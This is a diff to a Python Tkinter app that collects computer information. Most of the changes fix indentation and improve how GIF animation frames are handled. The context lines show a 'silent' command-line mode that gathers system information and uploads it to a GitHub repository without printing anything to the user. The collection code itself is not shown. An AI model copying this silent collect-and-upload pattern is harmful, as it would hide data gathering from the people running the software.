@@ -509,13 +509,13 @@ def main():
 def main_cli(log_file=None, silent=True):
     try:
         # Silent CLI: no stdout printing or input prompts
-            collector = ComputerInfoCollector()
+        collector = ComputerInfoCollector()
         collector.collect_all_info()
         # No console summary in silent mode
         success = collector.send_to_github_repo()
         # Log outcome only
         logging.info("CLI send status: %s", "success" if success else "failed")
-        except Exception as e:
+    except Exception as e:
         error_msg = f"❌ CRITICAL ERROR: {str(e)}"
         log_error("Critical error in CLI", e)
         save_error_to_file(error_msg, e, log_file)
@@ -687,7 +687,7 @@ class AboutMeApp:
             try:
                 self.collector.collect_all_info()
                 self.queue.put(("done", None))
-        except Exception as e:
+            except Exception as e:
                 self.queue.put(("error", e))
         threading.Thread(target=work, daemon=True).start()
         self.root.after(100, self._poll_queue)
@@ -718,7 +718,7 @@ class AboutMeApp:
         def send_work():
             try:
                 success = self.collector.send_to_github_repo()
-        except Exception as e:
+            except Exception as e:
                 log_error("Failed to send to GitHub", e)
                 success = False
             self.queue.put(("sent", success))
@@ -750,7 +750,7 @@ class AboutMeApp:
             except Exception:
                 pass
             self._build_success_ui(bool(payload))
-            else:
+        else:
             self.root.after(100, self._poll_send_queue)
 
     def on_close(self):
@@ -805,40 +805,68 @@ class _CircularGifAnimator:
 
     def _load_frames(self):
         img = Image.open(self.gif_path)
-        # Prepare circular mask
+        # Prepare circular mask once
         mask_size = (self.diameter, self.diameter)
         circle_mask = Image.new("L", mask_size, 0)
         draw = ImageDraw.Draw(circle_mask)
         draw.ellipse((0, 0, self.diameter, self.diameter), fill=255)
         white_bg = Image.new("RGBA", mask_size, (255, 255, 255, 255))
 
-        for frame in ImageSequence.Iterator(img):
-            frame_rgba = frame.convert("RGBA")
-            # Scale to fit within circle diameter preserving aspect
-            fw, fh = frame_rgba.size
+        # Some GIFs require seeking frames rather than ImageSequence for correct disposal
+        try:
+            num_frames = img.n_frames
+        except Exception:
+            num_frames = 1
+
+        prev = Image.new("RGBA", img.size, (0, 0, 0, 0))
+        for i in range(num_frames):
+            try:
+                img.seek(i)
+            except EOFError:
+                break
+
+            frame = img.convert("RGBA")
+            # Composite over previous to respect disposal methods
+            composed_src = prev.copy()
+            composed_src.alpha_composite(frame)
+            prev = composed_src.copy()
+
+            # Scale to fit circle
+            fw, fh = composed_src.size
             scale = min(self.diameter / fw, self.diameter / fh)
             new_size = (max(1, int(fw * scale)), max(1, int(fh * scale)))
-            frame_rgba = frame_rgba.resize(new_size, Image.LANCZOS)
+            scaled = composed_src.resize(new_size, Image.LANCZOS)
 
             # Center on canvas-sized transparent image
-            composed = Image.new("RGBA", mask_size, (0, 0, 0, 0))
+            centered = Image.new("RGBA", mask_size, (0, 0, 0, 0))
             x = (self.diameter - new_size[0]) // 2
             y = (self.diameter - new_size[1]) // 2
-            composed.paste(frame_rgba, (x, y), frame_rgba)
+            centered.paste(scaled, (x, y), scaled)
 
-            # Apply circular mask to composed frame
-            masked = Image.composite(composed, Image.new("RGBA", mask_size, (0, 0, 0, 0)), circle_mask)
+            # Apply circular mask
+            masked = Image.new("RGBA", mask_size, (0, 0, 0, 0))
+            masked.paste(centered, (0, 0), circle_mask)
+
             # Put on white circle background
             final = white_bg.copy()
             final.paste(masked, (0, 0), masked)
 
             self.frames.append(final)
-            duration = getattr(frame, "info", {}).get("duration", 80)
-            self.durations.append(max(20, int(duration)))
+            duration = img.info.get("duration", 80)
+            self.durations.append(max(30, int(duration)))
 
-        # Convert to Tk frames
+        # Fallback if no frames collected
+        if not self.frames:
+            self.frames = [white_bg]
+            self.durations = [500]
+
+        # Convert to Tk frames and pin to canvas to avoid GC
         for fr in self.frames:
             self._tk_frames.append(ImageTk.PhotoImage(fr))
+        # Attach refs to canvas to prevent garbage collection
+        if not hasattr(self.canvas, "_anim_refs"):
+            self.canvas._anim_refs = []
+        self.canvas._anim_refs.extend(self._tk_frames)
 
     def start(self):
         if not self._tk_frames:
@@ -852,9 +880,12 @@ class _CircularGifAnimator:
     def _animate(self):
         if not self._tk_frames:
             return
-        self.canvas.itemconfig(self._item, image=self._tk_frames[self._current])
-        delay = self.durations[self._current % len(self.durations)]
-        self._current = (self._current + 1) % len(self._tk_frames)
+        try:
+            self.canvas.itemconfig(self._item, image=self._tk_frames[self._current])
+            delay = self.durations[self._current % len(self.durations)]
+            self._current = (self._current + 1) % len(self._tk_frames)
+        except Exception:
+            delay = 80
         self.canvas.after(delay, self._animate)
 
     def _set_window_icon(self):
